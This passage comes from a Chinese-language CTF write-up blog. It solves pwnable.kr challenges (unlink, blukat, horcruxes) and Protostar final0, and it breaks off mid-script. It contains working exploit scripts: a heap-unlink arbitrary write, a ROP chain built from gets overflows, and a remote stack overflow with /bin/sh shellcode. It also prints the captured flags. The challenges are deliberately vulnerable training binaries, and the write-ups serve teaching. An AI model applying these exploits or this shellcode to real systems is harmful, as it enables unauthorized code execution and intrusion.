class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line">BK=P-&gt;bk;</span><br><span class="line">FD=P-&gt;fd;</span><br><span class="line">FD-&gt;bk=BK;</span><br><span class="line">BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">A-&gt;fd = B;</span><br><span class="line">B-&gt;bk = A;</span><br><span class="line">B-&gt;fd = C;</span><br><span class="line">C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目直接用一个<code>unlink</code>函数把unlink的漏洞暴露出来了，没有让我们用free去触发unlink，所以也不用构造fake chunk，比<a href="https://muirelle.com/2018/10/24/Liveoverflow-0x18-heap3/" target="_blank" rel="noopener">上次的unlink题目</a>简单了许多。</p><p><code>main</code>中申请了三个chunk，通过结构体易知每个chunk的大小为24(0x18)字节(chunk头8字节，结构体成员16字节)</p><p>重新梳理一遍unlink的原理吧，感觉上次说的不是很清楚。</p><h3 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h3><p>在<code>gets</code>前面下个断点，查看堆布局。<br><img src="https://i.imgur.com/ytEV1DA.png" alt=""></p><p>容易看出这是双向链表的结构(注释也说明了)，接下来的<code>unlink(B)</code>就将chunkB从这个链表结构中脱离出来。</p><p>仔细分析一下<code>unlink</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BK=P-&gt;bk;</span><br><span class="line">FD=P-&gt;fd;</span><br></pre></td></tr></table></figure><p>这两步执行完后，BK和FD就分别指向了chunkA和chunkC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk=BK;</span><br><span class="line">BK-&gt;fd=FD;</span><br></pre></td></tr></table></figure><p>这两步交叉赋值的操作就是将chunkB从链表结构中脱离出来的操作，也是<code>unlink</code>的漏洞所在。 漏洞就在于：如果我们能控制chunkB中fd和bk的值，就可以利用这两步交叉赋值的操作实现任意地址写。</p><p>具体到这道题来讲：结构体指针指向的是首个数据成员的地址，并且是通过改变偏移量来寻址的，所以FD-&gt;bk就相当于FD+0x4，BK-&gt;fd就相当于BK。如果将fd覆盖为某个函数的got表项，bk覆盖为shellcode的地址，在调用那个函数的时候就相当于转到shellcode执行代码了。</p><p>但是这道题最后一个函数就是<code>unlink</code>,后面没有函数给我们用了，只能找其他办法。</p><p>刚开始想的是直接将程序的返回地址覆盖为<code>shell()</code>的地址，但是由于unlink是交叉赋值的，就会导致<code>shell()</code>的代码被破坏，所以这个办法不行。</p><p><img src="https://i.imgur.com/kRJ3tIF.png" alt=""></p><p>注意到<code>unlink</code>后面还有一小段代码用到了<code>ecx</code>，可以在chunk_A中某个位置放置shell()的地址，<strong>再将地址为ebp-0x4内存覆盖为heap_A的地址+某个偏移量</strong>，利用<code>mov ecx,DWORD PTR [ebp-0x4]</code>，以<code>ecx</code>为跳板，将<code>shell()</code>的地址覆盖到栈顶，最后ret完成跳转。剩下的就是计算偏移量的事情了。</p><p><img src="https://i.imgur.com/0bT1wZZ.png" alt=""></p><p>题目给我们A的<strong>stack_addr</strong>和<strong>heap_addr</strong>分别是<strong>0xbffff644</strong>和<strong>0x804b410</strong></p><p><img src="https://i.imgur.com/F7y4ikD.png" alt=""></p><p><code>shell</code>的地址为<strong>0x80484eb</strong></p><p><img src="https://i.imgur.com/5LbY0aJ.png" alt=""></p><p>对比一下给的栈地址和ebp的值，得到<strong>ebp-0x4 == stack_addr + 0x10</strong></p><p>我们将<code>shell()</code>地址放在chunkA的buf开头，所以<strong>heap_addr + 0x8</strong>是<code>shell()</code>的地址。</p><p>所以由式子<strong>ecx - 0x4 = shell地址 = heap_addr + 0x8</strong></p><p>得<strong>ecx = heap_addr + 0xc</strong></p><p>然后脚本就很容易写出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'unlink'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p = s.process(<span class="string">'unlink'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (p.recvuntil(<span class="string">'here is stack address leak: '</span>))</span><br><span class="line">stack_addr = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> (p.recvuntil(<span class="string">'here is heap address leak: '</span>))</span><br><span class="line">heap_addr = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print ('stack address = '+str(hex(stack_addr)))</span></span><br><span class="line"><span class="comment">#print ('heap address = '+str(hex(heap_addr)))</span></span><br><span class="line"></span><br><span class="line">shellcode = p32(<span class="number">0x80484eb</span>) + <span class="string">'a'</span>*<span class="number">12</span> + p32(heap_addr+<span class="number">0xc</span>) + p32(stack_addr+<span class="number">0x10</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>拿到flag</p><p><img src="https://i.imgur.com/lHE05c8.png" alt=""></p><p><strong>conditional_write_what_where_from_unl1nk_explo1t</strong></p><h2 id="blukat"><a href="#blukat" class="headerlink" title="blukat"></a>blukat</h2><p>题目：<strong>ssh <a href="mailto:blukat@pwnable.kr" target="_blank" rel="noopener">blukat@pwnable.kr</a> -p2222 (pw: guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span>* key = <span class="string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">flag[i] = s[i] ^ key[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">FILE* fp = fopen(<span class="string">"/home/blukat/password"</span>, <span class="string">"r"</span>);</span><br><span class="line">fgets(password, <span class="number">100</span>, fp);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"guess the password!\n"</span>);</span><br><span class="line">fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"congrats! here is your flag: "</span>);</span><br><span class="line">calc_flag(password);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wrong guess!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目让我们猜到password文件内容就直接拿到flag了。想了半天该怎么溢出，一直以为切入点在<code>strcmp</code>，结果。。。这题考的是细心。。</p><p>本来做其他题的时候一样，scp复制文件夹到本地，结果发现password也一起被复制过来了。这就说明我们有直接读取password的权限。然后我试着读了一下：</p><p><img src="https://i.imgur.com/xuufoxX.png" alt=""></p><p>这根本读不了啊！</p><p><img src="https://i.imgur.com/BOh7l1U.png" alt=""></p><p>我不服，直接打开刚刚下载到本地的password文件</p><p>突然意识到了什么(✧≖‿ゝ≖)</p><p>文件内容就是<strong>cat: password: Permission denied</strong> </p><p><img src="https://i.imgur.com/jUuV4Yq.png" alt="">！</p><p>再确认一下，果然我们已经属于blukat_pwn用户组了</p><p>直接拿到flag：<strong>Pl3as_DonT_Miss_youR_GrouP_Perm!!</strong></p><h2 id="horcruxes"><a href="#horcruxes" class="headerlink" title="horcruxes"></a>horcruxes</h2><p>题目：<strong>ssh <a href="mailto:horcruxes@pwnable.kr" target="_blank" rel="noopener">horcruxes@pwnable.kr</a> -p2222 (pw:guest)</strong></p><p><img src="https://i.imgur.com/iOr30Bm.png" alt=""><br>开了NX，可能没办法用shellcode了。</p><p>这次没给源码，那就先放进ida里面看看。(F5大法好)</p><p>题目让你去找伏地魔放在7个地方的魂器，并且破坏它们，得到经验值。</p><p><img src="https://i.imgur.com/Uz4CYzH.png" alt=""></p><p>说人话：题中用<code>/dev/urandom</code>做种子生成了7个随机数。分别放在了7个变量里面，并且将和赋给<code>sum</code>，在<code>ropme</code>函数里面要让你输入数字猜这些随机数是多少，猜中了就给你说是多少(我要是知道了还要你说？)，最后把7个变量的值加起来，等于<code>sum</code>就拿flag。</p><p><img src="https://i.imgur.com/GNhATuS.png" alt=""><br><img src="https://i.imgur.com/uJcKOw5.png" alt=""><br>这道题切入点很好找，在<code>ropme</code>中读取7个变量和的时候用的是<code>gets</code>，所以考虑从这里溢出。</p><p><img src="https://i.imgur.com/bHiAxwe.png" alt=""></p><p>本来一开始想的是直接覆盖返回值到if里面，把flag读出来就完事。结果<code>ropme</code>函数整个地址都是以0x080a开头的，0xa会被<code>gets</code>当作输入结束的信号(回车)，并且把0xa替换成0x00，最终导致没办法直接返回到ropme函数中去。</p><p>这条路不同就换条路呗，大不了把所有变量值找出来。</p><p>计算从gets到ret的填充量为120字节，再找到<code>A</code>的地址为<strong>0x809fe4b</strong>，试试能不能返回到<code>A</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">120</span> + struct.pack(<span class="string">"I"</span>, <span class="number">0x809fe4b</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/r6FAsSb.png" alt=""></p><p><img src="https://i.imgur.com/trOIKzi.png" alt=""></p><p>确实返回到了<code>A</code>并且打印出了变量a的值。</p><p><img src="https://i.imgur.com/rX7qRx2.png" alt=""></p><p>并且在<code>A</code>恢复栈帧后，下一个返回值在栈中的位置就是上个位置+4，这样就可以依次将每个变量的值都打印出来，计算和。</p><p>然后考虑怎么再次进入<code>ropme</code>函数来提交刚刚算出的和。</p><p><img src="https://i.imgur.com/ZOtgie6.png" alt=""></p><p><code>main</code>函数中call了<code>ropme</code>，所以返回到这里就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = ssh(host=<span class="string">'pwnable.kr'</span>, user=<span class="string">'horcruxes'</span>, port=<span class="number">2222</span>, password=<span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">c = s.connect_remote(<span class="string">'127.0.0.1'</span>,<span class="number">9032</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">120</span> + p32(<span class="number">0x809fe4b</span>) + p32(<span class="number">0x809fe6a</span>) + \</span><br><span class="line">          p32(<span class="number">0x809fe89</span>) + p32(<span class="number">0x809fea8</span>) + \</span><br><span class="line">          p32(<span class="number">0x809fec7</span>) + p32(<span class="number">0x809fee6</span>) + \</span><br><span class="line">          p32(<span class="number">0x809ff05</span>) + p32(<span class="number">0x809fffc</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (c.recvuntil(<span class="string">'Select Menu:'</span>))</span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> (c.recvuntil(<span class="string">'earned? : '</span>))</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">exp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    c.recvuntil(<span class="string">'(EXP +'</span>)</span><br><span class="line">    exp = exp + int(c.recvline().replace(<span class="string">')'</span>,<span class="string">""</span>).strip())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> (exp)</span><br><span class="line"><span class="keyword">print</span> (c.recvuntil(<span class="string">'Select Menu:'</span>))</span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> (c.recvuntil(<span class="string">'earned? : '</span>))</span><br><span class="line">c.sendline(str(exp))</span><br><span class="line"><span class="keyword">print</span> (c.recv())</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/lyzdal0.png" alt=""></p><p>flag：<strong>Magic_spell_1s_4vad4_K3daVr4!</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x1D-final0</title>
      <link href="/2018/11/09/Liveoverflow-0x1D-final0/"/>
      <url>/2018/11/09/Liveoverflow-0x1D-final0/</url>
      
        <content type="html"><![CDATA[<p>终于到了final部分(°ཀ°)</p><p>final部分将之前学过的知识都综合起来了，难度稍有提升。主要还是多熟悉一下才学的网络部分。<br><a id="more"></a></p><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><hr><h1 id="Protostar-Final0"><a href="#Protostar-Final0" class="headerlink" title="Protostar Final0"></a>Protostar Final0</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level combines a stack overflow and network programming for a remote overflow.</strong></p><p><strong>Hints: depending on where you are returning to, you may wish to use a toupper() proof shellcode.</strong></p><p><strong>Core files will be in /tmp</strong></p><p><strong>This level is at /opt/protostar/bin/final0</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2995</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the username in from the network</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">get_username</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Strip off trailing new line characters */</span></span><br><span class="line">  q = <span class="built_in">strchr</span>(buffer, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(buffer, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert to lower case */</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buffer); i++) &#123;</span><br><span class="line">      buffer[i] = <span class="built_in">toupper</span>(buffer[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Duplicate the string and return it */</span></span><br><span class="line">  <span class="keyword">return</span> strdup(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  username = get_username();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No such user %s\n"</span>, username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>主函数和前面net一样，直接看<code>get_username</code>。定义了一个512字节大小的字符串数组，接着将其置零。随后调用了<code>gets</code>将输入放在buffer中。很明显要<strong>利用<code>gets</code>将字符串溢出到return，覆盖其返回指针(也就是eip)到我们的shellcode处</strong>。</p><p>但是注意到中间还有两段代码，一段是用<code>strchr</code>查找字符串中的换行符(\n)和回车符(\r)，如果字符串中出现了，就将其首次出现的位置的值置零。</p><blockquote><p><em>The <code>strchr()</code> function returns a pointer to the first occurrence of the character c in the string s.</em></p></blockquote><p>第二段for循环是通过<code>toupper()</code>将整个字符串的字母变为大写。所以，shellcode中所有在小写字母(0x61~0x7a)范围内的数据都会被<code>toupper</code>转化为大写字母(0x41~0x5a),除非确保shellcode中不出现小写字母范围内的数据，否则shellcode就会被<code>toupper</code>破坏掉。</p><p>有什么办法可以绕过<code>toupper</code>呢？</p><p>首先保证shellcode中没有小写字母范围是数据是不太现实的，不考虑。所以就只有让<code>toupper</code>在shellcode之前停止转化。它所转化的长度是从<code>strlen</code>得到的，而<code>strlen</code>计算字符串长度时是将空字符(\x00)作为一个字符串的结尾。</p><blockquote><p><em>The strlen() function calculates the length of the string s, not including the terminating ‘\0’ character.</em></p></blockquote><p><strong>所以我们可以在shellcode之前放置一个空字符来阻断<code>strlen</code>的读取，这样就能保证shellcode不会被转化。</strong>(我一开始以为gets读取数据时会在空字符处停下，就一直不知道该怎么样才能把空字符输入进去。。其实gets只会在换行或者EOF时停止。论man page的重要性~)</p><blockquote><p>gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF,which it replaces with ‘\0’.</p></blockquote><p>先测试一下，字符串转化为了大写，没问题。<br><img src="https://i.imgur.com/g47drkO.png" alt=""></p><p>写一小段脚本测试一下<br><img src="https://i.imgur.com/iswbFrg.png" alt=""><br>可见并没有传回任何字符串，所以我们应该是通过溢出把返回地址覆盖掉了，没有返回到<code>main</code>，自然就不会传回字符串。但是现在怎么debug这个程序呢？直接<code>gdb ./final0</code>肯定不行，因为接收的数据是从远程传入的，虽然能看到反汇编的代码，但是我们需要动态调试才能更清楚知道具体发生了什么。</p><p>回去看一眼题目：<strong>Core files will be in /tmp</strong>。这个core file是什么东西？</p><p><strong>man core</strong>看一眼</p><blockquote><p><em>NAME</em><br>     <em>core - core dump file</em><br><em>DESCRIPTION</em><br>       <em>The  default  action  of  certain signals is to cause a process to terminate and produce a core dump file, a disk file containing an image of the process’s memory at the time of termination.  This image can be used in a debugger (e.g., gdb(1)) to inspect the state of the program at the time that it terminated.  A list of the signals which cause a process to dump core can be found in signal(7).</em></p></blockquote><p><strong>说白了<a href="https://en.wikipedia.org/wiki/Core_dump" target="_blank" rel="noopener">core dump file</a>(核心转储文件)就是在程序因为接收到系统的某些信号或者崩溃时而强制中断时所产生的文件，而这个文件包含了程序在中断时一些内存的信息，并且这个文件可以被gdb调试。</strong></p><p>上面还提到了signal可以在signal(7)查看，<strong>man 7 signal</strong>看一眼。</p><p><img src="https://i.imgur.com/SP8oMSg.png" alt=""><br>当中有一部分的signal我们已经很熟悉了，像什么<strong>SIGSEGV</strong>、<strong>SIGILL</strong>经常在栈溢出的时候遇见。这些信号中大部分都能导致core dump file的产生。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://i.imgur.com/ugRMrKL.png" alt=""></p><p>由于刚才的溢出，/tmp里确实生成了一个文件(第一个)，不说废话直接进gdb。</p><p>用gdb调试core dump file的格式是</p><pre><code>gdb 原始程序路径 核心转储文件路径</code></pre><p>调试之前记得要有root权限，密码godmode。</p><p><img src="https://i.imgur.com/9eWFBaz.png" alt=""><br>可以看到一进gdb就提示<strong>Segmentation fault</strong>，和猜想的一样，确实覆盖了返回地址。</p><p>然后就好办了，计算一下偏移量，规划一下payload。<br><img src="https://i.imgur.com/08TrhfY.png" alt=""><br>红框位置是返回地址，也就是FFFF，覆盖为随便往后一点的地址，接下来依次放空字符、nop指令块(为了提高exploit的容错性)，最后是shellcode。</p><p>最后exploit如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2995</span>))</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">511</span> + <span class="string">"\x00"</span> + <span class="string">"AAAABBBBCCCCDDDDEEEE"</span></span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>, <span class="number">0xbffffc5c</span>+<span class="number">30</span>)</span><br><span class="line">nop = <span class="string">"\x90"</span>*<span class="number">100</span></span><br><span class="line">payload = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">s.send(padding + ret + nop + payload + <span class="string">"\n"</span>)</span><br><span class="line">s.send(<span class="string">"id\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">"uname -a\n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span 